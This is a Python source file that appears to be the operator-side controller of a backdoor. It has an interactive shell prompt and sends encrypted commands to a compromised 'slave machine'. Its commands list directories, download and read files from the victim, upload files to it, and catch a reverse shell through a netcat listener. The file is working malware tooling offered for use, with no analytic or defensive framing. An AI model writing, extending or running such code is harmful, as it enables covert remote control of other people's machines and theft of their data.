from sys import stderr, exit, stderr
from os import system, listdir, fork, wait
from socket import error as socket_error


from utils.crypto import encrypt, decrypt


def get_cmd():
    cmd = ""
    while cmd == "":
        cmd = input("[backdoor_shell] >>> ")
    return cmd


def send_cmd(conn, cmd):
    try:
        crypt_cmd = encrypt(cmd)
        conn.send(crypt_cmd)
    except socket_error:
        stderr.write("Error sending command\n")
    return conn 


def drop_shell(shell_port, status):
    pid = fork()
    if pid == 0:
        system("clear")
        print("\n[*] Dropping shell on slave machine ...")
        print("[+] Exit netcat sending SIGINT")
        cmd = "nc -l " + str(shell_port)
        system(cmd)
    else:
        wait()
    return status 


def recv_msg(conn, buffer):
    msg = ""
    try:
        crypt_msg = conn.recv(buffer)
        msg = decrypt(crypt_msg) 
    except socket_error:
        stderr.write("[x] Error receiving response\n")
    return conn, msg


def builtin_cmds(conn, cmd, shell_port, status):
    status = 0
    msg = ""
    if cmd[:5] == "shell":
        cmd += str(shell_port)
        conn = send_cmd(conn, cmd)
        status = drop_shell(shell_port, status)
    elif cmd[:2] == "ls":
        conn = send_cmd(conn, cmd)
        conn, msg = recv_msg(conn, 64000)
    elif cmd[:5] == "clear":
        system("clear")
        msg = "ACK\n"
    elif cmd[:4] == "exit":
        status = 1
    elif cmd[:2] == "dl":
        conn = send_cmd(conn, cmd)
        conn, msg = recv_msg(conn, 64000)
        with open("dump/"+str(cmd)[3:], "w") as fp:
                fp.write(msg[3:])
    elif cmd[:2] == "pl":
        conn = send_cmd(conn, cmd[:2])
        system("clear")
        for file in listdir():
            print(file)
        filename = input("$ ")
        with open(filename, "r") as fp:
            data = fp.read()
            conn = send_cmd(conn, data)
            msg = "[+] File uploaded to slave machine"
    elif cmd[:3] == "cat":
        filename = cmd[3:]
        conn = send_cmd(conn, cmd)
        conn, msg = recv_msg(conn, 64000)
    else:
        msg = "[x] Command not found"
    return conn, status, msg

def validate_msg(msg):
    slave_ack = msg[:3]
    msg = msg[3:]
    if slave_ack != "ACK":
        stderr.write("[x] Slave did not acknowledge the command\n")
    elif msg[:3] == "404":
        print("Error message from slave: %s" % (msg[3:]))
    else:
        print("%s\n" % msg)


def display_response(conn, msg):
    if msg == "":
        conn, msg = recv_msg(conn, 1024)
    validate_msg(msg)
    return conn


def cmd_shell(conn, shell_port, status):
    while status != 1:
        cmd = get_cmd()
        conn, status, msg = builtin_cmds(conn, cmd, shell_port, status)
        conn = display_response(conn, msg)


def backdoor_run(conn, shell_port):
    print("\n[+] Running backdoor...")
    status = 0
    cmd_shell(conn, shell_port, status)
